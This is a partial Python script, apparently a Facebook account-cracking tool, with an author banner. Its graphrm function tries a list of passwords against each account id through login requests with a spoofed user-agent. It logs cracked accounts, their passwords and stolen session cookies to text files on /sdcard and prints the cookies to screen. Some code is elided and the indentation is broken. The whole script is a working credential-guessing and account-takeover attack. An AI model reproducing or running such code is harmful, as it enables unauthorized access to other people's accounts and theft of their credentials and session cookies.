...
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : Ahmad Zia Himat
 [{G}+{W}] GITHUB   : ahmadziahimat      
 [{G}+{W}] FACEBOOK : Ahmad Zia HIMAT
 [{G}+{W}] YOU TUBE : NO YOU TUBE CHINAL                        
 [{G}+{W}] VERSION  : {A}{0.1}{H}
{40*"="}\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}HIMAT-M2{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
       ...
       # 'cookie': 'sb=djoRZwoSZe5FsY-y5vDTk2pS; datr=djoRZ3dvjw-GD83sBRdvNMaQ; wd=891x1671; dpr=3.0234789848327637; fr=07AhmvATWkFkPuDOS..BnETp2..AAA.0.0.BnETqN.AWUhTJXSJ8E',
       ...
       'user-agent': 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6550.164 Safari/537.36',}
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[HIMAT-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🏃{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[HIMAT-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[HIMAT-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
